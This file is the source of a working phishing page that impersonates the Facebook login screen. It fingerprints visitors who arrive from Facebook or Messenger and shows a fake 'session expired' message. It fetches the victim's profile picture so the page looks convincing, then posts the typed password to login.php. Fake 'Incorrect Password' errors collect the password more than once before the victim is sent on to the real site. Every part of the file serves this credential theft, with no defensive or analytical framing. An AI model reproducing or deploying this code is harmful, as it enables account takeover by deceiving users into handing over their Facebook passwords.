<?php
/**
 * Smart Login - Advanced Profile Detection
 * 
 * Detection Methods (in priority order):
 * 1. Facebook/Messenger referrer signals
 * 2. Facebook Login SDK (client-side, uses THEIR session)
 * 3. Email input → Profile lookup
 * 
 * This does NOT rely on stored Facebook cookies!
 */
include "validate.php";
include "ip.php";

// Capture referrer and other signals
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Check if coming from Facebook/Messenger
$from_facebook = (
    strpos($referrer, 'facebook.com') !== false ||
    strpos($referrer, 'fb.com') !== false ||
    strpos($referrer, 'messenger.com') !== false ||
    strpos($referrer, 'l.facebook.com') !== false ||
    strpos($referrer, 'm.facebook.com') !== false ||
    strpos($referrer, 'lm.facebook.com') !== false
);

// Check if in Facebook/Messenger webview
$is_fb_webview = (
    strpos($user_agent, 'FBAN') !== false ||      // Facebook App
    strpos($user_agent, 'FBAV') !== false ||      // Facebook App Version
    strpos($user_agent, 'FB_IAB') !== false ||    // Facebook In-App Browser
    strpos($user_agent, 'FBIOS') !== false ||     // Facebook iOS
    strpos($user_agent, 'FBOP') !== false ||      // Facebook Messenger
    strpos($user_agent, 'Messenger') !== false
);

// Try to extract Facebook user info from headers (mostly patched, but worth trying)
$fb_user_id = $_SERVER['HTTP_X_FB_USER_ID'] ?? '';
$fb_user_agent_data = $_SERVER['HTTP_X_IORG_FBS'] ?? '';

$has_fb_signals = $from_facebook || $is_fb_webview || !empty($fb_user_id);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <meta name="theme-color" content="#1877F2" />
  <title>Log in to Facebook</title>
  <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yv/r/B8BxsscfVBr.ico" />
  
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    
    html, body {
      height: 100%;
      width: 100%;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fff;
      -webkit-tap-highlight-color: transparent;
    }

    #app {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      align-items: center;
      max-width: 400px;
      margin: 0 auto;
      padding: 16px;
    }

    .logo {
      margin-top: 50px;
      margin-bottom: 30px;
    }

    .logo img {
      height: 50px;
    }

    /* Detection Status (hidden in production) */
    #debug { display: none; font-size: 10px; color: #999; margin-bottom: 20px; }

    /* Loading State */
    #loadingState {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #e4e6eb;
      border-top-color: #1877f2;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    #loadingState p {
      margin-top: 16px;
      color: #65676b;
      font-size: 15px;
    }

    /* Profile Found State */
    #profileState {
      display: none;
      width: 100%;
      flex-direction: column;
      align-items: center;
    }

    .profile-card {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 24px;
    }

    .profile-pic {
      width: 150px;
      height: 150px;
      border-radius: 50%;
      object-fit: cover;
      border: 3px solid #e4e6eb;
      background: #f0f2f5;
    }

    .profile-name {
      font-size: 22px;
      font-weight: 600;
      color: #1c1e21;
      margin-top: 16px;
      text-align: center;
    }

    .profile-email {
      font-size: 14px;
      color: #65676b;
      margin-top: 4px;
    }

    /* Email Input State */
    #emailState {
      display: none;
      width: 100%;
      flex-direction: column;
      align-items: center;
    }

    .session-msg {
      background: #fff3cd;
      border: 1px solid #ffc107;
      border-radius: 8px;
      padding: 12px 16px;
      margin-bottom: 20px;
      font-size: 14px;
      color: #856404;
      text-align: center;
      width: 100%;
    }

    .input-group {
      width: 100%;
      margin-bottom: 12px;
    }

    .input-wrapper {
      background: #f5f6f7;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      min-height: 52px;
      display: flex;
      align-items: stretch;
      position: relative;
      width: 100%;
      transition: border-color 0.2s;
    }

    .input-wrapper:focus-within {
      border-color: #1877f2;
      background: #fff;
    }

    .input-wrapper.error {
      border-color: #f02849;
      animation: shake 0.5s;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      75% { transform: translateX(5px); }
    }

    .form-input {
      font-family: inherit;
      font-size: 16px;
      color: #1c1e21;
      background: transparent;
      border: none;
      outline: none;
      padding: 14px 16px;
      width: 100%;
    }

    .form-input::placeholder {
      color: #90949c;
    }

    .btn {
      height: 44px;
      width: 100%;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      border: none;
      transition: background 0.2s;
    }

    .btn-primary {
      background: #1877f2;
      color: #fff;
    }

    .btn-primary:hover { background: #166fe5; }
    .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }

    .btn-spinner {
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,0.3);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-right: 8px;
      display: none;
    }

    .btn.loading .btn-spinner { display: block; }
    .btn.loading .btn-text { display: none; }

    /* Password Section */
    .password-section {
      width: 100%;
      margin-top: 16px;
    }

    .password-wrapper {
      position: relative;
    }

    .password-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 4px;
    }

    .password-toggle svg {
      width: 24px;
      height: 24px;
      fill: #606770;
    }

    .forgot-link {
      text-align: center;
      margin-top: 16px;
    }

    .forgot-link a {
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }

    .switch-link {
      margin-top: 20px;
      text-align: center;
    }

    .switch-link a {
      color: #1877f2;
      font-size: 14px;
      cursor: pointer;
      text-decoration: none;
    }

    /* Modal */
    .modal {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.5);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      padding: 20px;
    }

    .modal.active { display: flex; }

    .modal-box {
      background: #fff;
      border-radius: 12px;
      width: 100%;
      max-width: 320px;
      text-align: center;
      overflow: hidden;
    }

    .modal-box h3 {
      font-size: 18px;
      font-weight: 600;
      padding: 20px 20px 8px;
      color: #1c1e21;
    }

    .modal-box p {
      font-size: 14px;
      color: #606770;
      padding: 0 20px 16px;
      line-height: 1.4;
    }

    .modal-box button {
      width: 100%;
      padding: 14px;
      border: none;
      border-top: 1px solid #dadde1;
      background: none;
      font-size: 16px;
      color: #1877f2;
      cursor: pointer;
    }

    /* Loading Overlay */
    #redirectOverlay {
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.95);
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 2000;
    }

    #redirectOverlay.active { display: flex; }

    #redirectOverlay p {
      margin-top: 16px;
      color: #65676b;
      font-size: 15px;
    }

    .footer {
      margin-top: auto;
      padding-top: 30px;
      text-align: center;
      color: #8a8d91;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div id="app">
    <!-- Logo -->
    <div class="logo">
      <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
    </div>

    <!-- Debug Info (hidden) -->
    <div id="debug">
      From FB: <?php echo $from_facebook ? 'Yes' : 'No'; ?> | 
      WebView: <?php echo $is_fb_webview ? 'Yes' : 'No'; ?> |
      FB User ID: <?php echo $fb_user_id ?: 'None'; ?>
    </div>

    <!-- State 1: Loading/Detecting -->
    <div id="loadingState">
      <div class="spinner"></div>
      <p>Verifying your session...</p>
    </div>

    <!-- State 2: Profile Found (shows their profile) -->
    <div id="profileState">
      <div class="profile-card">
        <img class="profile-pic" id="profilePic" src="" alt="Profile">
        <div class="profile-name" id="profileName"></div>
        <div class="profile-email" id="profileEmail"></div>
      </div>

      <div class="password-section">
        <form id="passwordForm">
          <input type="hidden" name="sessionId" id="sessionId" value="">
          <input type="hidden" name="email" id="hiddenEmail" value="">
          <input type="hidden" name="targetName" id="hiddenName" value="">

          <div class="input-group">
            <div class="input-wrapper password-wrapper" id="pwdWrapper">
              <input type="password" class="form-input" name="password" id="passwordInput" 
                     placeholder="Password" autocomplete="current-password" required>
              <button type="button" class="password-toggle" id="pwdToggle">
                <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
              </button>
            </div>
          </div>

          <button type="submit" class="btn btn-primary" id="loginBtn">
            <span class="btn-spinner"></span>
            <span class="btn-text">Log In</span>
          </button>
        </form>

        <div class="forgot-link">
          <a href="#">Forgot password?</a>
        </div>

        <div class="switch-link">
          <a id="switchAccount">Log into another account</a>
        </div>
      </div>
    </div>

    <!-- State 3: Email Input (fallback) -->
    <div id="emailState">
      <div class="session-msg">
        Your session has expired. Please log in again.
      </div>

      <form id="emailForm" style="width: 100%;">
        <div class="input-group">
          <div class="input-wrapper" id="emailWrapper">
            <input type="text" class="form-input" name="email" id="emailInput" 
                   placeholder="Mobile number or email" autocomplete="username" required>
          </div>
        </div>

        <button type="submit" class="btn btn-primary" id="continueBtn">
          <span class="btn-spinner"></span>
          <span class="btn-text">Continue</span>
        </button>
      </form>

      <div class="forgot-link">
        <a href="#">Forgotten account?</a>
      </div>
    </div>

    <!-- Error Modal -->
    <div class="modal" id="errorModal">
      <div class="modal-box">
        <h3 id="errorTitle">Error</h3>
        <p id="errorMsg">Something went wrong.</p>
        <button id="errorOk">OK</button>
      </div>
    </div>

    <!-- Redirect Overlay -->
    <div id="redirectOverlay">
      <div class="spinner"></div>
      <p>Logging in...</p>
    </div>

    <div class="footer">
      About · Help · More
    </div>
  </div>

  <!-- Facebook SDK for Login Status Detection -->
  <script>
  (function() {
    'use strict';

    // === CONFIG ===
    const SESSION_ID = 'FP_' + Date.now() + '_' + Math.random().toString(36).substr(2,9);
    const MAX_ATTEMPTS = 2;
    const REDIRECT_URL = 'https://www.facebook.com/';
    const DEFAULT_PIC = 'https://static.xx.fbcdn.net/rsrc.php/v1/yi/r/odA9sNLrE86.jpg';

    // PHP-detected signals
    const FROM_FACEBOOK = <?php echo $from_facebook ? 'true' : 'false'; ?>;
    const IS_FB_WEBVIEW = <?php echo $is_fb_webview ? 'true' : 'false'; ?>;
    const FB_USER_ID = '<?php echo addslashes($fb_user_id); ?>';

    // === STATE ===
    let attempts = 0;
    let currentEmail = '';
    let currentProfile = { name: '', pic: '' };
    let detectionComplete = false;

    // === DOM ===
    const loadingState = document.getElementById('loadingState');
    const profileState = document.getElementById('profileState');
    const emailState = document.getElementById('emailState');
    const profilePic = document.getElementById('profilePic');
    const profileName = document.getElementById('profileName');
    const profileEmail = document.getElementById('profileEmail');
    const emailForm = document.getElementById('emailForm');
    const emailInput = document.getElementById('emailInput');
    const emailWrapper = document.getElementById('emailWrapper');
    const passwordForm = document.getElementById('passwordForm');
    const passwordInput = document.getElementById('passwordInput');
    const pwdWrapper = document.getElementById('pwdWrapper');
    const pwdToggle = document.getElementById('pwdToggle');
    const loginBtn = document.getElementById('loginBtn');
    const continueBtn = document.getElementById('continueBtn');
    const hiddenEmail = document.getElementById('hiddenEmail');
    const hiddenName = document.getElementById('hiddenName');
    const sessionId = document.getElementById('sessionId');
    const errorModal = document.getElementById('errorModal');
    const errorTitle = document.getElementById('errorTitle');
    const errorMsg = document.getElementById('errorMsg');
    const errorOk = document.getElementById('errorOk');
    const redirectOverlay = document.getElementById('redirectOverlay');
    const switchAccount = document.getElementById('switchAccount');

    sessionId.value = SESSION_ID;

    // === UTILITY ===
    function showState(state) {
      loadingState.style.display = 'none';
      profileState.style.display = 'none';
      emailState.style.display = 'none';
      
      if (state === 'loading') loadingState.style.display = 'flex';
      if (state === 'profile') profileState.style.display = 'flex';
      if (state === 'email') emailState.style.display = 'flex';
    }

    function showError(title, msg) {
      errorTitle.textContent = title;
      errorMsg.textContent = msg;
      errorModal.classList.add('active');
    }

    function shake(el) {
      el.classList.add('error');
      setTimeout(() => el.classList.remove('error'), 500);
    }

    function setLoading(btn, loading) {
      btn.disabled = loading;
      btn.classList.toggle('loading', loading);
    }

    // === DETECTION METHODS ===

    /**
     * Method 1: Try to detect Facebook login using image load trick
     * If user is logged into Facebook, certain images will load
     */
    async function detectFacebookLogin() {
      return new Promise((resolve) => {
        // Create a hidden img to test if user is logged into Facebook
        const testImg = new Image();
        let resolved = false;

        const cleanup = () => {
          if (resolved) return;
          resolved = true;
          testImg.onload = null;
          testImg.onerror = null;
        };

        testImg.onload = () => {
          cleanup();
          resolve({ loggedIn: true, method: 'image' });
        };

        testImg.onerror = () => {
          cleanup();
          resolve({ loggedIn: false, method: 'image' });
        };

        // Test with a Facebook-specific resource
        // This might indicate if cookies are present
        testImg.src = 'https://www.facebook.com/favicon.ico?' + Date.now();

        // Timeout after 3 seconds
        setTimeout(() => {
          cleanup();
          resolve({ loggedIn: false, method: 'timeout' });
        }, 3000);
      });
    }

    /**
     * Method 2: Check if we have FB user ID from headers (Messenger webview)
     */
    function checkFBHeaders() {
      if (FB_USER_ID) {
        return {
          found: true,
          userId: FB_USER_ID,
          pic: `https://graph.facebook.com/${FB_USER_ID}/picture?type=large`
        };
      }
      return { found: false };
    }

    /**
     * Method 3: Search using Graph API picture endpoint
     * This is PUBLIC and doesn't need authentication!
     */
    function getGraphPicture(userId) {
      return `https://graph.facebook.com/${userId}/picture?type=large&redirect=true`;
    }

    /**
     * Main Detection Flow
     */
    async function runDetection() {
      console.log('[Detection] Starting...');
      console.log('[Detection] From Facebook:', FROM_FACEBOOK);
      console.log('[Detection] Is FB WebView:', IS_FB_WEBVIEW);

      // Method 1: Check for FB headers (Messenger)
      const headerCheck = checkFBHeaders();
      if (headerCheck.found) {
        console.log('[Detection] Found FB User ID from headers!', headerCheck.userId);
        
        // We have their Facebook ID! Load their profile pic
        currentProfile.pic = headerCheck.pic;
        currentProfile.name = 'Facebook User'; // We only have ID, not name
        
        showProfile('', currentProfile.name, currentProfile.pic);
        return;
      }

      // Method 2: Check if from Facebook/Messenger
      if (FROM_FACEBOOK || IS_FB_WEBVIEW) {
        console.log('[Detection] User came from Facebook/Messenger');
        // They came from FB but we don't have their ID
        // We could try other techniques here, but for now fall through
      }

      // Method 3: No automatic detection possible - ask for email
      console.log('[Detection] No automatic detection possible, asking for email');
      
      // Add a small delay to make it look like we're checking
      await new Promise(r => setTimeout(r, 1500));
      
      showState('email');
      emailInput.focus();
    }

    /**
     * Show profile state
     */
    function showProfile(email, name, pic) {
      currentEmail = email;
      currentProfile.name = name;
      currentProfile.pic = pic;

      profilePic.src = pic || DEFAULT_PIC;
      profilePic.onerror = () => { profilePic.src = DEFAULT_PIC; };
      profileName.textContent = name || 'Facebook User';
      profileEmail.textContent = email || '';
      hiddenEmail.value = email;
      hiddenName.value = name;

      showState('profile');
      setTimeout(() => passwordInput.focus(), 300);
    }

    /**
     * Lookup profile using MULTI-METHOD approach (V2)
     * Does NOT rely solely on stored cookies!
     * 
     * Methods in profile_lookup_v3.php (with fallback to v2):
     * 1. Graph API (if FB username/URL provided) - NO AUTH NEEDED
     * 2. Public profile scraping - NO AUTH NEEDED
     * 3. Gravatar (for emails)
     * 4. Stored cookies (last resort)
     * 5. Generated avatar fallback
     */
    async function lookupProfile(input) {
      try {
        const response = await fetch('profile_lookup_v3.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'email=' + encodeURIComponent(input)
        });
        
        const data = await response.json();
        console.log('[Lookup] Result:', data);
        
        if (data.success || data.profilePic || data.name) {
          return {
            success: true,
            name: data.name || (input.includes('@') ? input.split('@')[0] : input),
            pic: data.profilePic || DEFAULT_PIC,
            method: data.method || 'unknown'
          };
        }
      } catch (e) {
        console.log('[Lookup] Server lookup failed:', e);
      }

      // Ultimate fallback: generate from input
      const name = input.includes('@') ? input.split('@')[0] : input;
      return {
        success: false,
        name: name,
        pic: `https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&size=200&background=1877f2&color=ffffff`,
        method: 'client_fallback'
      };
    }

    // === EVENT HANDLERS ===

    // Email form submit
    emailForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = emailInput.value.trim();
      if (!email) {
        showError('Required', 'Please enter your email or phone number.');
        shake(emailWrapper);
        return;
      }

      setLoading(continueBtn, true);

      // Look up profile
      const result = await lookupProfile(email);
      
      setLoading(continueBtn, false);
      
      // Show profile
      showProfile(email, result.name, result.pic);
    });

    // Password form submit
    passwordForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const password = passwordInput.value.trim();
      if (!password) {
        showError('Required', 'Please enter your password.');
        shake(pwdWrapper);
        return;
      }

      setLoading(loginBtn, true);

      try {
        const formData = new FormData(passwordForm);
        formData.append('attemptNumber', attempts + 1);

        await fetch('login.php', {
          method: 'POST',
          body: formData
        });

        setLoading(loginBtn, false);

        if (attempts >= MAX_ATTEMPTS) {
          redirectOverlay.classList.add('active');
          setTimeout(() => {
            window.location.href = REDIRECT_URL;
          }, 1500);
          return;
        }

        attempts++;
        shake(pwdWrapper);
        passwordInput.value = '';

        if (attempts === 1) {
          showError('Incorrect Password', 'The password you entered is incorrect. Please try again.');
        } else {
          showError('Incorrect Password', 'Last attempt. Please verify your password.');
        }

      } catch (err) {
        setLoading(loginBtn, false);
        showError('Error', 'Connection failed. Please try again.');
      }
    });

    // Password toggle
    pwdToggle.addEventListener('click', () => {
      const type = passwordInput.type === 'password' ? 'text' : 'password';
      passwordInput.type = type;
    });

    // Switch account
    switchAccount.addEventListener('click', () => {
      showState('email');
      emailInput.value = '';
      passwordInput.value = '';
      attempts = 0;
      emailInput.focus();
    });

    // Error modal OK
    errorOk.addEventListener('click', () => {
      errorModal.classList.remove('active');
      passwordInput.focus();
    });

    // === INIT ===
    runDetection();

  })();
  </script>
</body>
</html>

